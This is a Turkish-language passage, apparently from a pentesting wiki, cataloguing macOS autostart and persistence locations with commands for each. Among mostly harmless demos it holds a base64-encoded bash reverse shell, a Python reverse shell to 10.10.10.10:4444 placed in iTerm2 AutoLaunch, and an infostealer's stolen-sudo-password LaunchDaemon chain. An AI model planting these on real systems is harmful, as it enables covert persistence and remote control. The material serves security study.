# macOS Auto Start

{{#include ../banners/hacktricks-training.md}}

Bu bölüm büyük ölçüde [**Beyond the good ol' LaunchAgents**](https://theevilbit.github.io/beyond/) blog serisini temel alır. Amaç, **daha fazla Autostart Location** eklemek (mümkünse), günümüzde macOS'un en son sürümünde (13.4) **hangi tekniklerin hâlâ çalıştığını** belirtmek ve gereken **izinleri** açıklamaktır.

## Sandbox Bypass

> [!TIP]
> Burada, **sandbox bypass** için kullanışlı başlangıç konumlarını bulabilirsiniz. Bu konumlar, **root izinlerine ihtiyaç duymadan**, bir şeyi **bir dosyaya yazarak** ve çok **yaygın** bir **eylemi**, belirli bir **süreyi** veya sandbox içinden genellikle gerçekleştirebileceğiniz bir **eylemi** bekleyerek çalıştırmanıza olanak tanır.

### Launchd

- Sandbox bypass için kullanışlı: [✅](https://emojipedia.org/check-mark-button)
- TCC Bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Locations

- **`/Library/LaunchAgents`**
- **Trigger**: Reboot
- Root gerekli
- **`/Library/LaunchDaemons`**
- **Trigger**: Reboot
- Root gerekli
- **`/System/Library/LaunchAgents`**
- **Trigger**: Reboot
- Root gerekli
- **`/System/Library/LaunchDaemons`**
- **Trigger**: Reboot
- Root gerekli
- **`~/Library/LaunchAgents`**
- **Trigger**: Relog-in
- **`~/Library/LaunchDemons`**
- **Trigger**: Relog-in

> [!TIP]
> İlginç bir bilgi olarak, **`launchd`**, Mach-o bölümü `__Text.__config` içinde gömülü bir property list'e sahiptir. Bu liste, launchd'nin başlatması gereken diğer iyi bilinen servisleri içerir. Ayrıca bu servisler, çalıştırılmaları ve başarıyla tamamlanmaları gerektiği anlamına gelen `RequireSuccess`, `RequireRun` ve `RebootOnSuccess` değerlerini içerebilir.
>
> Elbette, code signing nedeniyle değiştirilemez.

#### Description & Exploitation

**`launchd`**, OX S kernel tarafından startup sırasında çalıştırılan **ilk** **process** ve shutdown sırasında tamamlanan son process'tir. Her zaman **PID 1** olmalıdır. Bu process, aşağıdaki konumlarda bulunan **ASEP** **plist** dosyalarında belirtilen yapılandırmaları **okur ve çalıştırır**:

- `/Library/LaunchAgents`: Admin tarafından yüklenen kullanıcı başına agent'lar
- `/Library/LaunchDaemons`: Admin tarafından yüklenen sistem genelindeki daemon'lar
- `/System/Library/LaunchAgents`: Apple tarafından sağlanan kullanıcı başına agent'lar.
- `/System/Library/LaunchDaemons`: Apple tarafından sağlanan sistem genelindeki daemon'lar.

Bir kullanıcı login olduğunda, `/Users/$USER/Library/LaunchAgents` ve `/Users/$USER/Library/LaunchDemons` konumlarında bulunan plist'ler **login olan kullanıcı izinleriyle** başlatılır.

**Agent'lar ile daemon'lar arasındaki temel fark, agent'ların kullanıcı login olduğunda, daemon'ların ise system startup sırasında yüklenmesidir** (örneğin ssh gibi bazı servislerin, herhangi bir kullanıcı sisteme erişmeden önce çalıştırılması gerekir). Ayrıca agent'lar GUI kullanabilirken daemon'ların arka planda çalışması gerekir.
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN">
<plist version="1.0">
<dict>
<key>Label</key>
<string>com.apple.someidentifier</string>
<key>ProgramArguments</key>
<array>
<string>bash -c 'touch /tmp/launched'</string> <!--Prog to execute-->
</array>
<key>RunAtLoad</key><true/> <!--Execute at system startup-->
<key>StartInterval</key>
<integer>800</integer> <!--Execute each 800s-->
<key>KeepAlive</key>
<dict>
<key>SuccessfulExit</key></false> <!--Re-execute if exit unsuccessful-->
<!--If previous is true, then re-execute in successful exit-->
</dict>
</dict>
</plist>
```
**kullanıcı giriş yapmadan önce çalıştırılması gereken** durumlar vardır; bunlara **PreLoginAgents** denir. Örneğin bu, giriş sırasında yardımcı teknolojiler sağlamak için kullanışlıdır. Bunlar ayrıca `/Library/LaunchAgents` konumunda bulunabilir ([**burada**](https://github.com/HelmutJ/CocoaSampleCode/tree/master/PreLoginAgents) bir örnek görebilirsiniz).

> [!TIP]
> Yeni Daemons veya Agents yapılandırma dosyaları **bir sonraki yeniden başlatmadan sonra veya** `launchctl load <target.plist>` **kullanılarak yüklenecektir.** `.plist` uzantısı olmayan dosyaları **yüklemek de mümkündür:** `launchctl -F <file>` (ancak bu plist dosyaları yeniden başlatmadan sonra otomatik olarak yüklenmez).\
> `launchctl unload <target.plist>` ile **kaldırmak** da mümkündür (bu dosyanın işaret ettiği process sonlandırılır),
>
> Bir **Agent** veya **Daemon**'ın **çalışmasını** **engelleyen** herhangi bir şeyin (örneğin bir override) **olmadığından** emin olmak için şunu çalıştırın: `sudo launchctl load -w /System/Library/LaunchDaemos/com.apple.smdb.plist`

Mevcut kullanıcı tarafından yüklenen tüm agents ve daemons'ları listeleyin:
```bash
launchctl list
```
#### Örnek kötü amaçlı LaunchDaemon zinciri (parola yeniden kullanımı)

Yakın zamanda görülen bir macOS infostealer, bir **ele geçirilmiş sudo parolasını** yeniden kullanarak bir user agent ve root LaunchDaemon yerleştirdi:<sup>[1]</sup>

- Agent döngüsünü `~/.agent` konumuna yazın ve çalıştırılabilir yapın.
- Bu agent'ı işaret eden bir plist'i `/tmp/starter` konumunda oluşturun.
- Çalınan parolayı `sudo -S` ile yeniden kullanarak dosyayı `/Library/LaunchDaemons/com.finder.helper.plist` konumuna kopyalayın, `root:wheel` olarak ayarlayın ve `launchctl load` ile yükleyin.
- Çıktıyı ayırmak için agent'ı `nohup ~/.agent >/dev/null 2>&1 &` ile sessizce başlatın.
```bash
printf '%s\n' "$pw" | sudo -S cp /tmp/starter /Library/LaunchDaemons/com.finder.helper.plist
printf '%s\n' "$pw" | sudo -S chown root:wheel /Library/LaunchDaemons/com.finder.helper.plist
printf '%s\n' "$pw" | sudo -S launchctl load /Library/LaunchDaemons/com.finder.helper.plist
nohup "$HOME/.agent" >/dev/null 2>&1 &
```
> [!WARNING]
> Bir plist bir kullanıcıya aitse, daemon sistem genelindeki klasörlerde bulunsa bile **görev root olarak değil kullanıcı olarak çalıştırılır**. Bu durum bazı privilege escalation saldırılarını önleyebilir.

#### launchd hakkında daha fazla bilgi

**`launchd`**, **kernel** tarafından başlatılan **ilk user mode process**'tir. Process başlangıcı **başarılı olmalıdır** ve process **çıkamaz veya crash olamaz**. Ayrıca bazı **killing signal**'larına karşı **korumalıdır**.

`launchd`'nin yapacağı ilk şeylerden biri, tüm **daemon**'ları başlatmaktır:

- Zamanlanmış olarak çalıştırılacak **Timer daemon**'ları:
- atd (`com.apple.atrun.plist`): 30 dakikalık bir `StartInterval` değerine sahiptir
- crond (`com.apple.systemstats.daily.plist`): 00:15'te başlatılmak için `StartCalendarInterval` değerine sahiptir
- **Network daemon**'ları:
- `org.cups.cups-lpd`: TCP üzerinde (`SockType: stream`), `SockServiceName: printer` ile dinleme yapar
- SockServiceName bir port veya `/etc/services` içindeki bir servis olmalıdır
- `com.apple.xscertd.plist`: TCP üzerinde 1640 portunu dinler
- Belirtilen bir path değiştiğinde çalıştırılan **Path daemon**'ları:
- `com.apple.postfix.master`: `/etc/postfix/aliases` path'ini kontrol eder
- **IOKit notification daemon**'ları:
- `com.apple.xartstorageremoted`: `"com.apple.iokit.matching" => { "com.apple.device-attach" => { "IOMatchLaunchStream" => 1 ...`
- **Mach port:**
- `com.apple.xscertd-helper.plist`: `MachServices` entry'sinde `com.apple.xscertd.helper` adını belirtir
- **UserEventAgent:**
- Bu, önceki örnekten farklıdır. Belirli bir event'e yanıt olarak launchd'nin app'leri spawn etmesini sağlar. Ancak bu durumda ilgili ana binary `launchd` değil, `/usr/libexec/UserEventAgent`'tır. SIP tarafından kısıtlanan `/System/Library/UserEventPlugins/` klasöründeki plugin'leri yükler. Her plugin, initializer'ını `XPCEventModuleInitializer` key'inde veya eski plugin'ler için `Info.plist` dosyasının `FB86416D-6164-2070-726F-70735C216EC0` key'i altındaki `CFPluginFactories` dict'inde belirtir.

### shell startup files

Writeup: [https://theevilbit.github.io/beyond/beyond_0001/](https://theevilbit.github.io/beyond/beyond_0001/)\
Writeup (xterm): [https://theevilbit.github.io/beyond/beyond_0018/](https://theevilbit.github.io/beyond/beyond_0018/)

- sandbox'ı bypass etmek için kullanışlı: [✅](https://emojipedia.org/check-mark-button)
- TCC Bypass: [✅](https://emojipedia.org/check-mark-button)
- Ancak bu dosyaları yükleyen bir shell çalıştıran ve TCC bypass'a sahip bir app bulmanız gerekir

#### Konumlar

- **`~/.zshrc`, `~/.zlogin`, `~/.zshenv.zwc`**, **`~/.zshenv`, `~/.zprofile`**
- **Trigger**: zsh ile bir terminal açmak
- **`/etc/zshenv`, `/etc/zprofile`, `/etc/zshrc`, `/etc/zlogin`**
- **Trigger**: zsh ile bir terminal açmak
- Root gereklidir
- **`~/.zlogout`**
- **Trigger**: zsh ile bir terminalden çıkmak
- **`/etc/zlogout`**
- **Trigger**: zsh ile bir terminalden çıkmak
- Root gereklidir
- Potansiyel olarak daha fazlası: **`man zsh`**
- **`~/.bashrc`**
- **Trigger**: bash ile bir terminal açmak
- `/etc/profile` (çalışmadı)
- `~/.profile` (çalışmadı)
- `~/.xinitrc`, `~/.xserverrc`, `/opt/X11/etc/X11/xinit/xinitrc.d/`
- **Trigger**: xterm ile çalışması beklenir, ancak **kurulu değildir**; kurulduktan sonra bile şu hata alınır: xterm: `DISPLAY is not set`<sup>[3]</sup>

#### Açıklama ve Exploitation

`zsh` veya `bash` gibi bir shell environment başlatıldığında **bazı startup file'lar çalıştırılır**. macOS şu anda varsayılan shell olarak `/bin/zsh` kullanır. Terminal application başlatıldığında veya bir cihaza SSH üzerinden erişildiğinde bu shell'e otomatik olarak erişilir. `bash` ve `sh` macOS'ta mevcut olsa da kullanılmaları için açıkça çağrılmaları gerekir.<sup>[2]</sup>

**`man zsh`** ile okuyabileceğimiz zsh man page'i, startup file'ları hakkında uzun bir açıklama içerir.
```bash
# Example executino via ~/.zshrc
echo "touch /tmp/hacktricks" >> ~/.zshrc
```
### Yeniden Açılan Uygulamalar

> [!CAUTION]
> Belirtilen exploitation işlemini yapılandırmak ve oturumu kapatıp yeniden açmak veya hatta yeniden başlatmak, uygulamayı çalıştırmam için işe yaramadı. (Uygulama çalıştırılmıyordu; belki de bu işlemler gerçekleştirilirken çalışıyor olması gerekiyordur.)

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0021/](https://theevilbit.github.io/beyond/beyond_0021/)

- Sandbox bypass için kullanışlı: [✅](https://emojipedia.org/check-mark-button)
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Konum

- **`~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist`**
- **Tetikleyici**: Yeniden başlatma sonrasında uygulamaların yeniden açılması

#### Açıklama ve Exploitation

Yeniden açılacak tüm uygulamalar `~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist` plist dosyasının içindedir<sup>[4]</sup>

Bu nedenle, yeniden açılacak uygulamaların sizin uygulamanızı başlatmasını sağlamak için **uygulamanızı listeye eklemeniz** yeterlidir.

UUID, bu dizin listelenerek veya `ioreg -rd1 -c IOPlatformExpertDevice | awk -F'"' '/IOPlatformUUID/{print $4}'` komutuyla bulunabilir.

Yeniden açılacak uygulamaları kontrol etmek için şunu çalıştırabilirsiniz:
```bash
defaults -currentHost read com.apple.loginwindow TALAppsToRelaunchAtLogin
#or
plutil -p ~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist
```
Bu listeye **bir uygulama eklemek** için şunu kullanabilirsiniz:
```bash
# Adding iTerm2
/usr/libexec/PlistBuddy -c "Add :TALAppsToRelaunchAtLogin: dict" \
-c "Set :TALAppsToRelaunchAtLogin:$:BackgroundState 2" \
-c "Set :TALAppsToRelaunchAtLogin:$:BundleID com.googlecode.iterm2" \
-c "Set :TALAppsToRelaunchAtLogin:$:Hide 0" \
-c "Set :TALAppsToRelaunchAtLogin:$:Path /Applications/iTerm.app" \
~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist
```
### Terminal Tercihleri

Writeup: [https://theevilbit.github.io/beyond/beyond_0020/](https://theevilbit.github.io/beyond/beyond_0020/)

- sandbox'u bypass etmek için kullanışlı: [✅](https://emojipedia.org/check-mark-button)
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
- Terminal, kullanıcının kullandığı uygulamanın FDA izinlerine sahip olur

#### Konum

- **`~/Library/Preferences/com.apple.Terminal.plist`**
- **Tetikleyici**: Terminal'i açmak

#### Açıklama ve Exploitation

**`~/Library/Preferences`** içinde, Applications'daki kullanıcının tercihleri saklanır. Bu tercihlerden bazıları, **diğer applications/script'leri execute etmek** için bir configuration içerebilir.<sup>[5]</sup>

Örneğin Terminal, Startup sırasında bir command execute edebilir:

<figure><img src="../images/image (1148).png" alt="" width="495"><figcaption></figcaption></figure>

Bu config, **`~/Library/Preferences/com.apple.Terminal.plist`** dosyasına şu şekilde yansır:
```bash
[...]
"Window Settings" => {
"Basic" => {
"CommandString" => "touch /tmp/terminal_pwn"
"Font" => {length = 267, bytes = 0x62706c69 73743030 d4010203 04050607 ... 00000000 000000cf }
"FontAntialias" => 1
"FontWidthSpacing" => 1.004032258064516
"name" => "Basic"
"ProfileCurrentVersion" => 2.07
"RunCommandAsShell" => 0
"type" => "Window Settings"
}
[...]
```
Yani, sistemdeki terminal tercihlerinin plist dosyasının üzerine yazılabilirse, **`open`** işlevi **terminali açmak ve bu komutu çalıştırmak** için kullanılabilir.

Bunu cli üzerinden şu şekilde ekleyebilirsiniz:
```bash
# Add
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"CommandString\" 'touch /tmp/terminal-start-command'" $HOME/Library/Preferences/com.apple.Terminal.plist
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"RunCommandAsShell\" 0" $HOME/Library/Preferences/com.apple.Terminal.plist

# Remove
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"CommandString\" ''" $HOME/Library/Preferences/com.apple.Terminal.plist
```
### Terminal Script'leri / Diğer dosya uzantıları

- Sandbox'u bypass etmek için kullanışlıdır: [✅](https://emojipedia.org/check-mark-button)
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
- Terminal kullanımı, kullanıcının FDA izinlerine sahip olur

#### Konum

- **Anywhere**
- **Trigger**: Terminal'i aç

#### Açıklama ve Exploitation

Bir [**`.terminal`** script'i](https://stackoverflow.com/questions/32086004/how-to-use-the-default-terminal-settings-when-opening-a-terminal-file-osx) oluşturup açarsanız, **Terminal uygulaması** içindeki belirtilen komutları çalıştırmak üzere otomatik olarak başlatılır. Terminal uygulamasının bazı özel ayrıcalıkları varsa (TCC gibi), komutunuz bu özel ayrıcalıklarla çalıştırılır.

Şununla deneyin:
```bash
# Prepare the payload
cat > /tmp/test.terminal << EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>CommandString</key>
<string>mkdir /tmp/Documents; cp -r ~/Documents /tmp/Documents;</string>
<key>ProfileCurrentVersion</key>
<real>2.0600000000000001</real>
<key>RunCommandAsShell</key>
<false/>
<key>name</key>
<string>exploit</string>
<key>type</key>
<string>Window Settings</string>
</dict>
</plist>
EOF

# Trigger it
open /tmp/test.terminal

# Use something like the following for a reverse shell:
<string>echo -n "YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvNDQ0NCAwPiYxOw==" | base64 -d | bash;</string>
```
Ayrıca normal shell script içeriğiyle **`.command`**, **`.tool`** uzantılarını da kullanabilirsiniz; bunlar da Terminal tarafından açılır.

> [!CAUTION]
> Terminal'de **Full Disk Access** varsa bu işlemi tamamlayabilir (çalıştırılan komutun bir Terminal penceresinde görünür olacağını unutmayın).

### Audio Plugins

Writeup: [https://theevilbit.github.io/beyond/beyond_0013/](https://theevilbit.github.io/beyond/beyond_0013/)\
Writeup: [https://posts.specterops.io/audio-unit-plug-ins-896d3434a882](https://posts.specterops.io/audio-unit-plug-ins-896d3434a882)

- Sandbox bypass için kullanışlı: [✅](https://emojipedia.org/check-mark-button)
- TCC bypass: [🟠](https://emojipedia.org/large-orange-circle)
- Bazı ek TCC erişimleri elde edebilirsiniz

#### Konum

- **`/Library/Audio/Plug-Ins/HAL`**
- Root gerekli
- **Tetikleyici**: coreaudiod'u veya bilgisayarı yeniden başlatın
- **`/Library/Audio/Plug-ins/Components`**
- Root gerekli
- **Tetikleyici**: coreaudiod'u veya bilgisayarı yeniden başlatın
- **`~/Library/Audio/Plug-ins/Components`**
- **Tetikleyici**: coreaudiod'u veya bilgisayarı yeniden başlatın
- **`/System/Library/Components`**
- Root gerekli
- **Tetikleyici**: coreaudiod'u veya bilgisayarı yeniden başlatın

#### Açıklama

Önceki writeup'lara göre bazı audio plugin'lerini **derlemek** ve yüklenmelerini sağlamak mümkündür.<sup>[6][7]</sup>

### QuickLook Plugins

Writeup: [https://theevilbit.github.io/beyond/beyond_0012/](https://theevilbit.github.io/beyond/beyond_0012/)

- Sandbox bypass için kullanışlı: [✅](https://emojipedia.org/check-mark-button)
- TCC bypass: [🟠](https://emojipedia.org/large-orange-circle)
- Bazı ek TCC erişimleri elde edebilirsiniz

#### Konum

- `/System/Library/QuickLook`
- `/Library/QuickLook`
- `~/Library/QuickLook`
- `/Applications/AppNameHere/Contents/Library/QuickLook/`
- `~/Applications/AppNameHere/Contents/Library/QuickLook/`

#### Açıklama ve Exploitation

QuickLook plugin'leri, bir dosyanın **önizlemesini tetiklediğinizde** (Finder'da dosya seçiliyken boşluk çubuğuna bastığınızda) ve bu dosya türünü **destekleyen bir plugin** yüklü olduğunda çalıştırılabilir.<sup>[8]</sup>

Kendi QuickLook plugin'inizi derleyip önceki konumlardan birine yerleştirerek yüklenmesini sağlayabilir, ardından desteklenen bir dosyaya gidip tetiklemek için boşluk çubuğuna basabilirsiniz.

### ~~Login/Logout Hooks~~

> [!CAUTION]
> Bu işlem bende ne kullanıcı LoginHook'u ne de root LogoutHook'u ile çalıştı.

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0022/](https://theevilbit.github.io/beyond/beyond_0022/)

- Sandbox bypass için kullanışlı: [✅](https://emojipedia.org/check-mark-button)
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Konum

- `defaults write com.apple.loginwindow LoginHook /Users/$USER/hook.sh` benzeri bir şeyi çalıştırabilmeniz gerekir.
- `~/Library/Preferences/com.apple.loginwindow.plist` konumunda bulunur.

Kullanımdan kaldırılmıştır, ancak bir kullanıcı giriş yaptığında komutları çalıştırmak için kullanılabilirler.<sup>[9]</sup>
```bash
cat > $HOME/hook.sh << EOF
#!/bin/bash
echo 'My is: \`id\`' > /tmp/login_id.txt
EOF
chmod +x $HOME/hook.sh
defaults write com.apple.loginwindow LoginHook /Users/$USER/hook.sh
defaults write com.apple.loginwindow LogoutHook /Users/$USER/hook.sh
```
Bu ayar `/Users/$USER/Library/Preferences/com.apple.loginwindow.plist` içinde saklanır.
```bash
defaults read /Users/$USER/Library/Preferences/com.apple.loginwindow.plist
{
LoginHook = "/Users/username/hook.sh";
LogoutHook = "/Users/username/hook.sh";
MiniBuddyLaunch = 0;
TALLogoutReason = "Shut Down";
TALLogoutSavesState = 0;
oneTimeSSMigrationComplete = 1;
}
```
Silmek için:
```bash
defaults delete com.apple.loginwindow LoginHook
defaults delete com.apple.loginwindow LogoutHook
```
Root kullanıcıya ait olan `/private/var/root/Library/Preferences/com.apple.loginwindow.plist` içinde saklanır.

## Koşullu Sandbox Bypass

> [!TIP]
> Burada, bir şeyi **bir dosyaya yazarak** çalıştırmanıza ve belirli **programların yüklü olması**, "alışılmadık" kullanıcı eylemleri veya ortamlar gibi çok yaygın olmayan koşulları **beklemenize** olanak tanıyan **sandbox bypass** için kullanışlı başlangıç konumlarını bulabilirsiniz.

### Cron

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0004/](https://theevilbit.github.io/beyond/beyond_0004/)

- Sandbox bypass için kullanışlı: [✅](https://emojipedia.org/check-mark-button)
- Ancak `crontab` binary'sini çalıştırabilmeniz gerekir
- Ya da root olmanız gerekir
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Konum

- **`/usr/lib/cron/tabs/`, `/private/var/at/tabs`, `/private/var/at/jobs`, `/etc/periodic/`**
- Doğrudan yazma erişimi için root gerekir. `crontab <file>` çalıştırabiliyorsanız root gerekmez
- **Tetikleyici**: Cron job'a bağlıdır

#### Açıklama ve Exploitation

**Mevcut kullanıcının** cron job'larını şununla listeleyin:
```bash
crontab -l
```
Ayrıca kullanıcıların tüm cron görevlerini **`/usr/lib/cron/tabs/`** ve **`/var/at/tabs/`** dizinlerinde görebilirsiniz (root gerekir).

MacOS'ta **belirli sıklıkta** script çalıştıran çeşitli klasörler şurada bulunabilir:
```bash
# The one with the cron jobs is /usr/lib/cron/tabs/
ls -lR /usr/lib/cron/tabs/ /private/var/at/jobs /etc/periodic/
```
Burada normal **cron** **jobs**, **at** **jobs** (çok sık kullanılmaz) ve **periodic** **jobs** (çoğunlukla geçici dosyaları temizlemek için kullanılır) bulunabilir. Günlük periodic jobs örneğin şu komutla çalıştırılabilir: `periodic daily`.<sup>[10]</sup>

**user cronjob**'u programatik olarak eklemek için şu kullanılabilir:
```bash
echo '* * * * * /bin/bash -c "touch /tmp/cron3"' > /tmp/cron
crontab /tmp/cron
```
### iTerm2

Writeup: [https://theevilbit.github.io/beyond/beyond_0002/](https://theevilbit.github.io/beyond/beyond_0002/)

- Sandbox bypass için kullanışlı: [✅](https://emojipedia.org/check-mark-button)
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
- iTerm2 daha önce verilmiş TCC izinlerine sahipti

#### Konumlar

- **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch`**
- **Tetikleyici**: iTerm'i açma
- **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch.scpt`**
- **Tetikleyici**: iTerm'i açma
- **`~/Library/Preferences/com.googlecode.iterm2.plist`**
- **Tetikleyici**: iTerm'i açma

#### Açıklama ve Exploitation

**`~/Library/Application Support/iTerm2/Scripts/AutoLaunch`** konumunda depolanan script'ler çalıştırılır. Örneğin:<sup>[11]</sup>
```bash
cat > "$HOME/Library/Application Support/iTerm2/Scripts/AutoLaunch/a.sh" << EOF
#!/bin/bash
touch /tmp/iterm2-autolaunch
EOF

chmod +x "$HOME/Library/Application Support/iTerm2/Scripts/AutoLaunch/a.sh"
```
veya:
```bash
cat > "$HOME/Library/Application Support/iTerm2/Scripts/AutoLaunch/a.py" << EOF
#!/usr/bin/env python3
import iterm2,socket,subprocess,os

async def main(connection):
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('10.10.10.10',4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(['zsh','-i']);
async with iterm2.CustomControlSequenceMonitor(
connection, "shared-secret", r'^create-window$') as mon:
while True:
match = await mon.async_get()
await iterm2.Window.async_create(connection)

iterm2.run_forever(main)
EOF
```
**`~/Library/Application Support/iTerm2/Scripts/AutoLaunch.scpt`** script'i de çalıştırılacaktır:
```bash
do shell script "touch /tmp/iterm2-autolaunchscpt"
```
**`~/Library/Preferences/com.googlecode.iterm2.plist`** konumunda bulunan iTerm2 tercihleri, iTerm2 terminali açıldığında **yürütülecek bir komut belirtebilir**.

Bu ayar iTerm2 ayarlarında yapılandırılabilir:

<figure><img src="../images/image (37).png" alt="" width="563"><figcaption></figcaption></figure>

Ve komut tercihlere yansıtılır:
```bash
plutil -p com.googlecode.iterm2.plist
{
[...]
"New Bookmarks" => [
0 => {
[...]
"Initial Text" => "touch /tmp/iterm-start-command"
```
Çalıştırılacak komutu şu şekilde ayarlayabilirsiniz:
```bash
# Add
/usr/libexec/PlistBuddy -c "Set :\"New Bookmarks\":0:\"Initial Text\" 'touch /tmp/iterm-start-command'" $HOME/Library/Preferences/com.googlecode.iterm2.plist

# Call iTerm
open /Applications/iTerm.app/Contents/MacOS/iTerm2

# Remove
/usr/libexec/PlistBuddy -c "Set :\"New Bookmarks\":0:\"Initial Text\" ''" $HOME/Library/Preferences/com.googlecode.iterm2.plist
```
> [!WARNING]
> **iTerm2 preferences**'ı abuse ederek arbitrary commands execute etmenin **başka yolları** olma ihtimali oldukça yüksek.

### xbar

Writeup: [https://theevilbit.github.io/beyond/beyond_0007/](https://theevilbit.github.io/beyond/beyond_0007/)

- sandbox bypass için kullanışlı: [✅](https://emojipedia.org/check-mark-button)
- Ancak xbar kurulu olmalıdır
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
- Accessibility permissions ister

#### Konum

- **`~/Library/Application\ Support/xbar/plugins/`**
- **Tetikleyici**: xbar execute edildiğinde

#### Açıklama

Popüler program [**xbar**](https://github.com/matryer/xbar) kuruluysa, **`~/Library/Application\ Support/xbar/plugins/`** içinde xbar başlatıldığında execute edilecek bir shell script yazmak mümkündür:<sup>[12]</sup>
```bash
cat > "$HOME/Library/Application Support/xbar/plugins/a.sh" << EOF
#!/bin/bash
touch /tmp/xbar
EOF
chmod +x "$HOME/Library/Application Support/xbar/plugins/a.sh"
```
### Hammerspoon

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0008/](https://theevilbit.github.io/beyond/beyond_0008/)

- sandbox bypass için kullanışlı: [✅](https://emojipedia.org/check-mark-button)
- Ancak Hammerspoon yüklü olmalıdır
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
- Accessibility izinleri ister

#### Konum

- **`~/.hammerspoon/init.lua`**
- **Tetikleyici**: Hammerspoon çalıştırıldığında

#### Açıklama

[**Hammerspoon**](https://github.com/Hammerspoon/hammerspoon), işlemleri için **LUA scripting language** kullanan bir **macOS** automation platformudur. Özellikle eksiksiz AppleScript kodlarının entegre edilmesini ve shell script'lerinin çalıştırılmasını destekleyerek scripting yeteneklerini önemli ölçüde geliştirir.<sup>[13]</sup>

Uygulama tek bir dosyayı, `~/.hammerspoon/init.lua`, arar ve başlatıldığında script çalıştırılır.
```bash
mkdir -p "$HOME/.hammerspoon"
cat > "$HOME/.hammerspoon/init.lua" << EOF
hs.execute("/Applications/iTerm.app/Contents/MacOS/iTerm2")
EOF
```
### BetterTouchTool

- Sandbox bypass için kullanışlı: [✅](https://emojipedia.org/check-mark-button)
- Ancak BetterTouchTool kurulu olmalıdır
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
- Automation-Shortcuts ve Accessibility izinlerini ister

#### Konum

- `~/Library/Application Support/BetterTouchTool/*`

Bu araç, bazı kısayollara basıldığında çalıştırılacak uygulamaları veya script'leri belirtmeye olanak tanır. Bir attacker, **veritabanında kendi kısayolunu ve çalıştırılacak action'ı yapılandırarak** arbitrary code çalıştırılmasını sağlayabilir (bir kısayol yalnızca bir tuşa basmak olabilir).

### Alfred

- Sandbox bypass için kullanışlı: [✅](https://emojipedia.org/check-mark-button)
- Ancak Alfred kurulu olmalıdır
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
- Automation, Accessibility ve hatta Full-Disk access izinlerini ister

#### Konum

- `???`

Belirli koşullar karşılandığında code çalıştırabilen workflow'lar oluşturmaya olanak tanır. Potansiyel olarak bir attacker'ın bir workflow dosyası oluşturup Alfred'in bunu yüklemesini sağlaması mümkündür (workflow'ları kullanmak için premium sürümün satın alınması gerekir).

### SSHRC

Writeup: [https://theevilbit.github.io/beyond/beyond_0006/](https://theevilbit.github.io/beyond/beyond_0006/)

- Sandbox bypass için kullanışlı: [✅](https://emojipedia.org/check-mark-button)
- Ancak ssh etkinleştirilmiş ve kullanılıyor olmalıdır
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
- SSH, FDA access'e sahip olmak için kullanılır

#### Konum

- **`~/.ssh/rc`**
- **Trigger**: ssh ile Login
- **`/etc/ssh/sshrc`**
- Root gerekir
- **Trigger**: ssh ile Login

> [!CAUTION]
> ssh'yi açmak için Full Disk Access gerekir:
>
> ```bash
> sudo systemsetup -setremotelogin on
> ```

#### Açıklama ve Exploitation

Varsayılan olarak, `/etc/ssh/sshd_config` içinde `PermitUserRC no` bulunmadığı sürece, bir kullanıcı **SSH üzerinden Login olduğunda** **`/etc/ssh/sshrc`** ve **`~/.ssh/rc`** script'leri çalıştırılır.<sup>[14]</sup>

### **Login Items**

Writeup: [https://theevilbit.github.io/beyond/beyond_0003/](https://theevilbit.github.io/beyond/beyond_0003/)

- Sandbox bypass için kullanışlı: [✅](https://emojipedia.org/check-mark-button)
- Ancak `osascript`'i args ile çalıştırmanız gerekir
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Konumlar

- **`~/Library/Application Support/com.apple.backgroundtaskmanagementagent`**
- **Trigger:** Login
- `osascript` çağrılarak kaydedilen Exploit payload
- **`/var/db/com.apple.xpc.launchd/loginitems.501.plist`**
- **Trigger:** Login
- Root gerekir

#### Açıklama

System Preferences -> Users & Groups -> **Login Items** bölümünde **kullanıcı Login olduğunda çalıştırılacak item'ları** bulabilirsiniz.\
Bunları command line üzerinden listelemek, eklemek ve kaldırmak mümkündür:<sup>[15]</sup>
```bash
#List all items:
osascript -e 'tell application "System Events" to get the name of every login item'

#Add an item:
osascript -e 'tell application "System Events" to make login item at end with properties {path:"/path/to/itemname", hidden:false}'

#Remove an item:
osascript -e 'tell application "System Events" to delete login item "itemname"'
```
Bu öğeler **`~/Library/Application Support/com.apple.backgroundtaskmanagementagent`** dosyasında saklanır.

**Login items**, **`SMLoginItemSetEnabled`** API'si kullanılarak da belirtilebilir; bu API yapılandırmayı **`/var/db/com.apple.xpc.launchd/loginitems.501.plist`** içinde saklar.

### ZIP as Login Item

